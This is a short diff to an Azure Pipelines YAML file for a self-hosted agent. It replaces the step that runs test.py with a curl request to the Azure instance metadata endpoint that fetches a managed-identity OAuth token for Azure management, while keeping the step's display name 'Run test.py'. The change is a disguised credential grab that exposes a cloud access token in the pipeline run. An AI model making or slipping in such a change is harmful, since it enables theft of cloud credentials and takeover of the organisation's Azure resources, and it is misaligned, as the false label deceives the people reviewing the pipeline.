@@ -5,12 +5,8 @@ name: "WKL-npbxmzkwof3998151" # Specifies the self-hosted agent pool
 steps:
 - script: |
     sudo apt-get update -y
-    sudo apt-get install git -y # Install Git if not already available
-displayName: 'Install Git'
+    sudo apt-get install git curl -y # Install Git if not already available
+displayName: 'Install Git, Curl, etc'
 - script: |
-    # Install Python 3.11 if not installed
-    sudo apt install python3
-displayName: 'Install Python 3.11 if not present'
-- script: |
-    python3 test.py # Run python File
-  displayName: 'Run test.py'
+    curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
+displayName: 'Run test.py'
